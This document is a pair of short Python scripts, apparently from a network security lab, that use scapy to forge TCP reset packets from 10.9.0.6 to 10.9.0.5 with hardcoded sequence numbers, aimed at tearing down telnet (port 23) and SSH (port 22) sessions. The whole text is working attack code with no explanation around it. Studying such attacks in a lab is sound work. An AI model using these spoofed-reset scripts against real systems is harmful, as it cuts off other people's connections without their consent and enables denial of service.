#!/usr/bin/python
from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=44346, dport=23, flags="R", seq=1123904603)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

#!/usr/bin/python
from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=44106, dport=22, flags="R", seq=3113380253, ack=1253221379)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)